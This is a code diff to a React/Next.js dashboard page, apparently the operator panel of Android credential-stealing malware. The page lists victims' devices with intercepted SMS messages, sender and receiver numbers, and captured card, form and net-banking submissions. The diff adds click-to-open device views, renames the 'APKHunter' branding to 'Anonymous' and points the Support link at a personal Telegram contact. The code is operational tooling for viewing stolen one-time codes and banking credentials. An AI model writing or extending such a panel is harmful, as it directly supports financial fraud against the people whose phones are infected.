@@ -11,8 +11,6 @@ import Link from "next/link";
 import LineSpinner from "@/components/LineSpinner";
 
 
-
-
 const SearchIcon = () => (
   <svg
     className="h-4 w-4 text-slate-500"
@@ -366,7 +364,11 @@ export default function AllDataPage() {
     });
   }, [devices, searchQuery]);
 
-  const copyToClipboard = async (text: string) => {
+  const copyToClipboard = async (text: string, e?: React.MouseEvent) => {
+    if (e) {
+      e.stopPropagation();
+    }
+    
     if (typeof window === "undefined") {
       return;
     }
@@ -386,15 +388,27 @@ export default function AllDataPage() {
       document.body.removeChild(textarea);
     }
   };
+  
   const router = useRouter();
   const pathname = usePathname();
+
+  // Handle card click - Open in NEW TAB
+  const handleCardClick = (deviceId: string) => {
+    if (!deviceId || deviceId === "Unknown") {
+      return;
+    }
+    
+    // Open in new tab
+    const url = `/devices/${deviceId}`;
+    window.open(url, '_blank');
+  };
 
   return (
     <div className="min-h-screen bg-[#ffffff]">
       <header className="w-full bg-black">
         <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
           <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
-            APKHunter
+            Anonymous
           </Link>
           <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
             <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
@@ -403,14 +417,14 @@ export default function AllDataPage() {
             <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
               Setting
             </Link>
-            <a
-              href="https://t.me/AH_Support_bot"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-white/85 transition-colors hover:text-white"
-            >
-              Support
-            </a>
+ <a
+  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
+  target="_blank"
+  rel="noopener noreferrer"
+  className="text-white/85 transition-colors hover:text-white"
+>
+  Support
+</a>
             <button
               onClick={async () => {
                 await fetch("/api/logout", { method: "POST" });
@@ -457,316 +471,356 @@ export default function AllDataPage() {
           </div>
         </div>
 
-            {isLoading ? (
-              <LineSpinner />
-            ) : filteredDevices.length === 0 ? (
-              <Card className="surface-card p-10 text-center shadow-[0_4px_16px_rgba(0,0,0,0.08)]">
-                <p className="text-lg font-semibold text-(--text-main)">
-                  No matching devices found
-                </p>
-                <p className="mt-2 text-sm text-(--text-muted)">
-                  Try a different search term or wait for new data.
-                </p>
-              </Card>
-            ) : (
-              <div className="space-y-8">
-                {filteredDevices.map((device) => (
-                  <div key={device.id} className="space-y-3">
-                    <div className="flex flex-col gap-3">
-                      {device.smsLogs.map((sms) => (
-                        <Card key={sms.id} className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)]">
-                          <div className="mt-2 space-y-1">
-                            <span className="font-bold text-blue-800 flex flex-row">
-                              DATE
-                              <BiCopy
-                                onClick={() =>
-                                  copyToClipboard(
-                                    formatTimestamp(sms.timestamp),
-                                  )
-                                }
-                              />
-                            </span>
-                            <p className="text-[11px] font-semibold uppercase tracking-wide text-(--text-muted)">
-                              {formatTimestamp(sms.timestamp)}
-                            </p>
+        {isLoading ? (
+          <LineSpinner />
+        ) : filteredDevices.length === 0 ? (
+          <Card className="surface-card p-10 text-center shadow-[0_4px_16px_rgba(0,0,0,0.08)]">
+            <p className="text-lg font-semibold text-(--text-main)">
+              No matching devices found
+            </p>
+            <p className="mt-2 text-sm text-(--text-muted)">
+              Try a different search term or wait for new data.
+            </p>
+          </Card>
+        ) : (
+          <div className="space-y-8">
+            {filteredDevices.map((device) => (
+              <div key={device.id} className="space-y-3">
+                <div className="flex flex-col gap-3">
+                  {device.smsLogs.map((sms) => (
+                    <div
+                      key={sms.id}
+                      onClick={() => handleCardClick(device.id)}
+                      style={{ cursor: 'pointer' }}
+                      className="block"
+                    >
+                      <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
+                        <div className="mt-2 space-y-1">
+                          <span className="font-bold text-blue-800 flex flex-row">
+                            DATE
+                            <BiCopy
+                              onClick={(e) => copyToClipboard(formatTimestamp(sms.timestamp), e)}
+                            />
+                          </span>
+                          <p className="text-[11px] font-semibold uppercase tracking-wide text-gray-500">
+                            {formatTimestamp(sms.timestamp)}
+                          </p>
 
-                            <span className="font-bold text-blue-800 flex flex-row">
-                              MSG
-                              <BiCopy
-                                onClick={() => copyToClipboard(sms.body)}
-                              />
-                            </span>
-                            <p className="text-[13px] text-red-600">
-                              {sms.body}
-                            </p>
+                          <span className="font-bold text-blue-800 flex flex-row">
+                            MSG
+                            <BiCopy
+                              onClick={(e) => copyToClipboard(sms.body, e)}
+                            />
+                          </span>
+                          <p className="text-[13px] text-red-600">
+                            {sms.body}
+                          </p>
 
-                            <span className="font-bold text-blue-800 flex flex-row">
-                              SENDER
-                              <BiCopy
-                                onClick={() =>
-                                  copyToClipboard(sms.senderNumber)
-                                }
-                              />
-                            </span>
-                            <p className="text-[13px] text-(--text-muted)">
-                              {sms.senderNumber}
-                            </p>
+                          <span className="font-bold text-blue-800 flex flex-row">
+                            SENDER
+                            <BiCopy
+                              onClick={(e) => copyToClipboard(sms.senderNumber, e)}
+                            />
+                          </span>
+                          <p className="text-[13px] text-gray-600">
+                            {sms.senderNumber}
+                          </p>
 
-                            {sms.receiverNumber && (
-                              <>
-                                <span className="font-bold text-blue-800 flex flex-row">
-                                  RECIVER
-                                  <BiCopy
-                                    onClick={() =>
-                                      copyToClipboard(sms.receiverNumber)
-                                    }
-                                  />
-                                </span>
-                                <p className="text-[13px] text-(--text-muted)">
-                                  {sms.receiverNumber}
-                                </p>
-                              </>
-                            )}
+                          {sms.receiverNumber && (
+                            <>
+                              <span className="font-bold text-blue-800 flex flex-row">
+                                RECEIVER
+                                <BiCopy
+                                  onClick={(e) => copyToClipboard(sms.receiverNumber, e)}
+                                />
+                              </span>
+                              <p className="text-[13px] text-gray-600">
+                                {sms.receiverNumber}
+                              </p>
+                            </>
+                          )}
 
-                            <span className="font-bold text-blue-800 flex flex-row">
-                              ID
-                              <BiCopy
-                                onClick={() => copyToClipboard(device.id)}
-                              />
-                            </span>
-                            <p className="text-[13px] text-(--text-muted)">
-                              {device.id}
-                            </p>
-                          </div>
-                        </Card>
-                      ))}
+                          <span className="font-bold text-blue-800 flex flex-row">
+                            DEVICE ID
+                            <BiCopy
+                              onClick={(e) => copyToClipboard(device.id, e)}
+                            />
+                          </span>
+                          <p className="text-[13px] text-gray-600 font-mono">
+                            {device.id}
+                          </p>
 
-                      {device.formSubmissions.map((submission) => {
-                        const timestamp =
-                          submission.timestamp ||
-                          submission.createdAt ||
-                          submission.updatedAt;
-
-                        return (
-                          <Card
-                            key={submission.id}
-                            className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
-                          >
-                            <div className="mt-2 space-y-1">
-                              {Object.entries(submission).map(
-                                ([key, value]) => (
-                                  <div
-                                    key={key}
-                                    className="flex flex-col gap-1 text-sm text-(--text-muted)"
-                                  >
-                                    {key === "id" && (
-                                      <>
-                                      <span className="font-bold text-blue-800 flex flex-row">
-                                        ID
-                                        <BiCopy
-                                          onClick={() =>
-                                            copyToClipboard(String(device.id))
-                                          }
-                                        />
-                                      </span>
-                                      <p className="text-[13px] text-(--text-muted)">
-                                        {device.id}
-                                      </p>
-                                      </>
-                                    )}
-                                    {!(
-                                      key.toLowerCase().includes("timestamp") ||
-                                      key.toLowerCase().includes("createdat") ||
-                                      key.toLowerCase().includes("updatedat") ||
-                                      key.toLowerCase().includes("id")
-                                    ) && (
-                                      <>
-                                        <div className="flex flex-row items-center gap-1">
-                                          <span className="font-semibold text-blue-800 uppercase">
-                                            {key}:
-                                          </span>
-
-                                          <FaCopy
-                                            onClick={() =>
-                                              navigator.clipboard.writeText(
-                                                String(value),
-                                              )
-                                            }
-                                          />
-                                        </div>
-
-                                        <span>
-                                          {formatDisplayValue(key, value)}
-                                        </span>
-                                      </>
-                                    )}
-                                  </div>
-                                ),
-                              )}
+                          {(device.brand !== "Unknown" || device.model !== "Unknown") && (
+                            <div className="mt-2 pt-2 border-t border-gray-200">
+                              <p className="text-[11px] text-gray-500">
+                                📱 {device.brand} {device.model}
+                              </p>
                             </div>
-                            {timestamp !== null && timestamp !== undefined && (
-                              <div className="flex justify-end mt-2">
-                                <span className="text-xs text-gray-500">
-                                  {formatSmartTime(Number(timestamp))}
-                                </span>
-                              </div>
-                            )}
-                          </Card>
-                        );
-                      })}
-
-                      {device.cardSubmissions.map((submission) => {
-                        const timestamp =
-                          submission.timestamp ||
-                          submission.createdAt ||
-                          submission.updatedAt;
-
-                        return (
-                          <Card
-                            key={submission.id}
-                            className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
-                          >
-                            <div className="mt-2 space-y-1">
-                              {Object.entries(submission).map(
-                                ([key, value]) => (
-                                  <div
-                                    key={key}
-                                    className="flex flex-col gap-1 text-sm text-(--text-muted)"
-                                  >
-                                      {key === "id" && (
-                                      <>
-                                      <span className="font-bold text-blue-800 flex flex-row">
-                                        ID
-                                        <BiCopy
-                                          onClick={() =>
-                                            copyToClipboard(String(device.id))
-                                          }
-                                        />
-                                      </span>
-                                      <p className="text-[13px] text-(--text-muted)">
-                                        {device.id}
-                                      </p>
-                                      </>
-                                    )}
-                                    {!(
-                                      key.toLowerCase().includes("timestamp") ||
-                                      key.toLowerCase().includes("createdat") ||
-                                      key.toLowerCase().includes("updatedat") || 
-                                      key.toLowerCase().includes("id")
-                                    ) && (
-                                      <>
-                                        <div className="flex flex-row items-center gap-1">
-                                          <span className="font-semibold text-blue-800 uppercase">
-                                            {key}:
-                                          </span>
-
-                                          <FaCopy
-                                            onClick={() =>
-                                              navigator.clipboard.writeText(
-                                                String(value),
-                                              )
-                                            }
-                                          />
-                                        </div>
-
-                                        <span>
-                                          {formatDisplayValue(key, value)}
-                                        </span>
-                                      </>
-                                    )}
-                                  </div>
-                                ),
-                              )}
-                            </div>
-                            {timestamp !== null && timestamp !== undefined && (
-                              <div className="flex justify-end mt-2">
-                                <span className="text-xs text-gray-500">
-                                  {formatSmartTime(Number(timestamp))}
-                                </span>
-                              </div>
-                            )}
-                          </Card>
-                        );
-                      })}
-
-                      {device.netBankingSubmissions.map((submission) => {
-                        const timestamp =
-                          submission.timestamp ||
-                          submission.createdAt ||
-                          submission.updatedAt;
-
-                        return (
-                          <Card
-                            key={submission.id}
-                            className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
-                          >
-                            <div className="mt-2 space-y-1">
-                              {Object.entries(submission).map(
-                                ([key, value]) => (
-                                  <div
-                                    key={key}
-                                    className="flex flex-col gap-1 text-sm text-(--text-muted)"
-                                  >
-                                      {key === "id" && (
-                                      <>
-                                      <span className="font-bold text-blue-800 flex flex-row">
-                                        ID
-                                        <BiCopy
-                                          onClick={() =>
-                                            copyToClipboard(String(device.id))
-                                          }
-                                        />
-                                      </span>
-                                      <p className="text-[13px] text-(--text-muted)">
-                                        {device.id}
-                                      </p>
-                                      </>
-                                    )}
-                                    {!(
-                                      key.toLowerCase().includes("timestamp") ||
-                                      key.toLowerCase().includes("createdat") ||
-                                      key.toLowerCase().includes("updatedat") || 
-                                      key.toLowerCase().includes("id")
-                                    ) && (
-                                      <>
-                                        <div className="flex flex-row items-center gap-1">
-                                          <span className="font-semibold text-blue-800 uppercase">
-                                            {key}:
-                                          </span>
-
-                                          <FaCopy
-                                            onClick={() =>
-                                              navigator.clipboard.writeText(
-                                                String(value),
-                                              )
-                                            }
-                                          />
-                                        </div>
-
-                                        <span>
-                                          {formatDisplayValue(key, value)}
-                                        </span>
-                                      </>
-                                    )}
-                                  </div>
-                                ),
-                              )}
-                            </div>
-                            {timestamp !== null && timestamp !== undefined && (
-                              <div className="flex justify-end mt-2">
-                                <span className="text-xs text-gray-500">
-                                  {formatSmartTime(Number(timestamp))}
-                                </span>
-                              </div>
-                            )}
-                          </Card>
-                        );
-                      })}
+                          )}
+                        </div>
+                      </Card>
                     </div>
-                  </div>
-                ))}
+                  ))}
+
+                  {device.formSubmissions.map((submission) => {
+                    const timestamp =
+                      submission.timestamp ||
+                      submission.createdAt ||
+                      submission.updatedAt;
+
+                    return (
+                      <div
+                        key={submission.id}
+                        onClick={() => handleCardClick(device.id)}
+                        style={{ cursor: 'pointer' }}
+                        className="block"
+                      >
+                        <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
+                          <div className="mt-2 space-y-1">
+                            {Object.entries(submission).map(
+                              ([key, value]) => (
+                                <div
+                                  key={key}
+                                  className="flex flex-col gap-1 text-sm text-gray-600"
+                                >
+                                  {key === "id" && (
+                                    <>
+                                      <span className="font-bold text-blue-800 flex flex-row">
+                                        DEVICE ID
+                                        <BiCopy
+                                          onClick={(e) => copyToClipboard(String(device.id), e)}
+                                        />
+                                      </span>
+                                      <p className="text-[13px] text-gray-600 font-mono">
+                                        {device.id}
+                                      </p>
+                                    </>
+                                  )}
+                                  {!(
+                                    key.toLowerCase().includes("timestamp") ||
+                                    key.toLowerCase().includes("createdat") ||
+                                    key.toLowerCase().includes("updatedat") ||
+                                    key.toLowerCase().includes("id")
+                                  ) && (
+                                    <>
+                                      <div className="flex flex-row items-center gap-1">
+                                        <span className="font-semibold text-blue-800 uppercase">
+                                          {key}:
+                                        </span>
+
+                                        <FaCopy
+                                          onClick={(e) => {
+                                            e.stopPropagation();
+                                            navigator.clipboard.writeText(
+                                              String(value),
+                                            );
+                                          }}
+                                        />
+                                      </div>
+
+                                      <span>
+                                        {formatDisplayValue(key, value)}
+                                      </span>
+                                    </>
+                                  )}
+                                </div>
+                              ),
+                            )}
+                            
+                            {(device.brand !== "Unknown" || device.model !== "Unknown") && (
+                              <div className="mt-2 pt-2 border-t border-gray-200">
+                                <p className="text-[11px] text-gray-500">
+                                  📱 {device.brand} {device.model}
+                                </p>
+                              </div>
+                            )}
+                          </div>
+                          {timestamp !== null && timestamp !== undefined && (
+                            <div className="flex justify-end mt-2">
+                              <span className="text-xs text-gray-500">
+                                {formatSmartTime(Number(timestamp))}
+                              </span>
+                            </div>
+                          )}
+                        </Card>
+                      </div>
+                    );
+                  })}
+
+                  {device.cardSubmissions.map((submission) => {
+                    const timestamp =
+                      submission.timestamp ||
+                      submission.createdAt ||
+                      submission.updatedAt;
+
+                    return (
+                      <div
+                        key={submission.id}
+                        onClick={() => handleCardClick(device.id)}
+                        style={{ cursor: 'pointer' }}
+                        className="block"
+                      >
+                        <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
+                          <div className="mt-2 space-y-1">
+                            {Object.entries(submission).map(
+                              ([key, value]) => (
+                                <div
+                                  key={key}
+                                  className="flex flex-col gap-1 text-sm text-gray-600"
+                                >
+                                  {key === "id" && (
+                                    <>
+                                      <span className="font-bold text-blue-800 flex flex-row">
+                                        DEVICE ID
+                                        <BiCopy
+                                          onClick={(e) => copyToClipboard(String(device.id), e)}
+                                        />
+                                      </span>
+                                      <p className="text-[13px] text-gray-600 font-mono">
+                                        {device.id}
+                                      </p>
+                                    </>
+                                  )}
+                                  {!(
+                                    key.toLowerCase().includes("timestamp") ||
+                                    key.toLowerCase().includes("createdat") ||
+                                    key.toLowerCase().includes("updatedat") || 
+                                    key.toLowerCase().includes("id")
+                                  ) && (
+                                    <>
+                                      <div className="flex flex-row items-center gap-1">
+                                        <span className="font-semibold text-blue-800 uppercase">
+                                          {key}:
+                                        </span>
+
+                                        <FaCopy
+                                          onClick={(e) => {
+                                            e.stopPropagation();
+                                            navigator.clipboard.writeText(
+                                              String(value),
+                                            );
+                                          }}
+                                        />
+                                      </div>
+
+                                      <span>
+                                        {formatDisplayValue(key, value)}
+                                      </span>
+                                    </>
+                                  )}
+                                </div>
+                              ),
+                            )}
+                            
+                            {(device.brand !== "Unknown" || device.model !== "Unknown") && (
+                              <div className="mt-2 pt-2 border-t border-gray-200">
+                                <p className="text-[11px] text-gray-500">
+                                  📱 {device.brand} {device.model}
+                                </p>
+                              </div>
+                            )}
+                          </div>
+                          {timestamp !== null && timestamp !== undefined && (
+                            <div className="flex justify-end mt-2">
+                              <span className="text-xs text-gray-500">
+                                {formatSmartTime(Number(timestamp))}
+                              </span>
+                            </div>
+                          )}
+                        </Card>
+                      </div>
+                    );
+                  })}
+
+                  {device.netBankingSubmissions.map((submission) => {
+                    const timestamp =
+                      submission.timestamp ||
+                      submission.createdAt ||
+                      submission.updatedAt;
+
+                    return (
+                      <div
+                        key={submission.id}
+                        onClick={() => handleCardClick(device.id)}
+                        style={{ cursor: 'pointer' }}
+                        className="block"
+                      >
+                        <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
+                          <div className="mt-2 space-y-1">
+                            {Object.entries(submission).map(
+                              ([key, value]) => (
+                                <div
+                                  key={key}
+                                  className="flex flex-col gap-1 text-sm text-gray-600"
+                                >
+                                  {key === "id" && (
+                                    <>
+                                      <span className="font-bold text-blue-800 flex flex-row">
+                                        DEVICE ID
+                                        <BiCopy
+                                          onClick={(e) => copyToClipboard(String(device.id), e)}
+                                        />
+                                      </span>
+                                      <p className="text-[13px] text-gray-600 font-mono">
+                                        {device.id}
+                                      </p>
+                                    </>
+                                  )}
+                                  {!(
+                                    key.toLowerCase().includes("timestamp") ||
+                                    key.toLowerCase().includes("createdat") ||
+                                    key.toLowerCase().includes("updatedat") || 
+                                    key.toLowerCase().includes("id")
+                                  ) && (
+                                    <>
+                                      <div className="flex flex-row items-center gap-1">
+                                        <span className="font-semibold text-blue-800 uppercase">
+                                          {key}:
+                                        </span>
+
+                                        <FaCopy
+                                          onClick={(e) => {
+                                            e.stopPropagation();
+                                            navigator.clipboard.writeText(
+                                              String(value),
+                                            );
+                                          }}
+                                        />
+                                      </div>
+
+                                      <span>
+                                        {formatDisplayValue(key, value)}
+                                      </span>
+                                    </>
+                                  )}
+                                </div>
+                              ),
+                            )}
+                            
+                            {(device.brand !== "Unknown" || device.model !== "Unknown") && (
+                              <div className="mt-2 pt-2 border-t border-gray-200">
+                                <p className="text-[11px] text-gray-500">
+                                  📱 {device.brand} {device.model}
+                                </p>
+                              </div>
+                            )}
+                          </div>
+                          {timestamp !== null && timestamp !== undefined && (
+                            <div className="flex justify-end mt-2">
+                              <span className="text-xs text-gray-500">
+                                {formatSmartTime(Number(timestamp))}
+                              </span>
+                            </div>
+                          )}
+                        </Card>
+                      </div>
+                    );
+                  })}
+                </div>
               </div>
-            )}
+            ))}
+          </div>
+        )}
       </main>
     </div>
   );
